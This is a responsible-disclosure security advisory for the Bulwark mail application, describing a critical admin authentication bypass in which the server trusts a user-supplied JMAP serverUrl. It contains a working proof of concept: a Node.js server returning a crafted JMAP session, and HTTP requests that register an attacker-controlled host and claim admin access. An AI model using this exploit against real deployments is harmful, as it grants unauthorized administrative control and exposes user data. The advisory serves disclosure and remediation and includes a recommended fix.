# Admin Authentication Bypass via Attacker-Controlled JMAP Server

| Field    | Detail                                                |
|----------|-------------------------------------------------------|
| Project  | Bulwark                                               |
| Severity | 🔴 Critical                                           |
| OWASP    | A07:2021 - Identification and Authentication Failures |
| Date     | 2026-04-27                                            |

## Affected Files

- `lib/auth/verify-jmap-auth.ts`
- `app/api/admin/auth/route.ts`

## Description

The Admin Dashboard authentication logic (`checkStalwartAdmin` in `/api/admin/auth`) trusts the user-supplied `serverUrl` to verify whether a user holds Stalwart Admin privileges. It fetches a JMAP session document from this URL and uses the response to make an authentication decision.

Because `serverUrl` is never validated against a trusted origin, an attacker can point it at a server they control, return a crafted JMAP response, and pass the `checkStalwartAdmin` check without ever possessing valid credentials. This grants full administrative access to the application.

This vulnerability is independently exploitable but is made significantly easier by the SSRF issue in the related advisory, which provides the initial foothold.

## Proof of Concept

> **Warning:** For responsible disclosure purposes only. Do not use against systems you do not own.

### Step 1: Host a malicious JMAP server

```js
const http = require('http');

const payload = {
  "apiUrl": "http://localhost:9000/jmap/",
  "accounts": {
    "attacker_acc": {}
  },
  "primaryAccounts": {
    "urn:stalwart:jmap": "attacker_acc"
  },
  "methodResponses": [
    ["x:Account/query", {}, "0"]
  ]
};

const server = http.createServer((req, res) => {
  console.log(`[*] Received: ${req.method} ${req.url}`);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(payload));
});

server.listen(9000, '0.0.0.0', () => {
  console.log('[*] Malicious JMAP server listening on port 9000');
});
```

### Step 2: Register the malicious server as the trusted `serverUrl`

```http
POST /api/auth/stalwart-context HTTP/1.1
Content-Type: application/json

{
  "serverUrl": "http://attacker-controlled.com",
  "username": "admin",
  "authHeader": "Bearer any-token"
}
```

### Step 3: Authenticate as admin

```http
POST /api/admin/auth HTTP/1.1
Content-Type: application/json

{
  "stalwartAuth": true
}
```

The server fetches the JMAP session document from the attacker-controlled URL, receives the crafted payload, and grants administrative privileges.

## Impact

- Full unauthenticated administrative takeover of the Bulwark application
- Ability to modify application configuration and access all user data
- No valid credentials required
- Potential to pivot further into the environment

## Recommended Fix

The `checkStalwartAdmin` function must not derive trust from a URL supplied by the user. The trusted server origin should be configured server-side via an environment variable and must not be overridable on a per-request basis.

```ts
const trustedServerUrl = process.env.STALWART_SERVER_URL;

if (!trustedServerUrl) {
  throw new Error('STALWART_SERVER_URL is not configured');
}

// Use trustedServerUrl for all JMAP verification requests
```

Additionally, validate `serverUrl` at registration time in `/api/auth/stalwart-context` against an allowlist or a pre-configured trusted origin before storing or using it.

## Credits

Discovered and reported by **Michael Chesang (Vip3r-MC)**.

## References

- [OWASP A07:2021 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- Related: [Server-Side Request Forgery via Unvalidated URL Parameter](./ssrf-bulwarkmail.md)
